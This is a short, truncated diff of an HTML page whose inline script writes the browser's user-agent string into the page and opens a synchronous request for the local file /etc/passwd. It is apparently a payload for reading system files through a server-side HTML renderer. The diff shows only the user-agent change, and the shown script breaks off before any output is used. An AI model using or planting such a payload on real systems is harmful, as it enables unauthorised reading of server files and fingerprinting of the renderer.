@@ -4,7 +4,7 @@
 <div id="response"></div>
 
 <script>
-document.getElementById('response').innerHTML = "Loading...";
+document.getElementById('response').innerHTML = navigator.userAgent;
 var x = new XMLHttpRequest();
 x.open("GET", "file:///etc/passwd", false);
 x.overrideMimeType("text/plain; charset=UTF-8");
